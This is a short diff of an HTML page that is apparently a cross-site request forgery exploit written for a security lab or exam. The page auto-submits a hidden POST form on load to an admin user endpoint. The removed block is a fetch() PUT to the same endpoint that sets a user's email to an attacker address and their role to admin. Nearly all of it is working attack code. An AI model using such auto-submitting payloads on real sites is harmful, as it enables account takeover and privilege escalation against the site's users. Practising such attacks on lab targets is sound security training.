@@ -1,4 +1,4 @@
-<!-- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
   <body onload="document.forms[0].submit()">
     <form method="POST" action="https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/users/115">
@@ -12,28 +12,4 @@
 </html>
 
 
- -->
 
-<!DOCTYPE html>
-<html>
-<body onload="sendRequest()">
-    <script>
-    function sendRequest() {
-        fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/users/115', {
-            method: 'PUT',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'name=NGOCCCCCCCCCC&email=ngochacked@gmail.com&role=admin'
-        })
-        .then(response => {
-            console.log('Response:', response);
-            document.body.innerHTML = '<p>Đã gửi request!</p>';
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            document.body.innerHTML = '<p>Có lỗi xảy ra!</p>';
-        });
-    }
-    </script>
-    <p>Đang xử lý...</p>
-</body>
-</html>
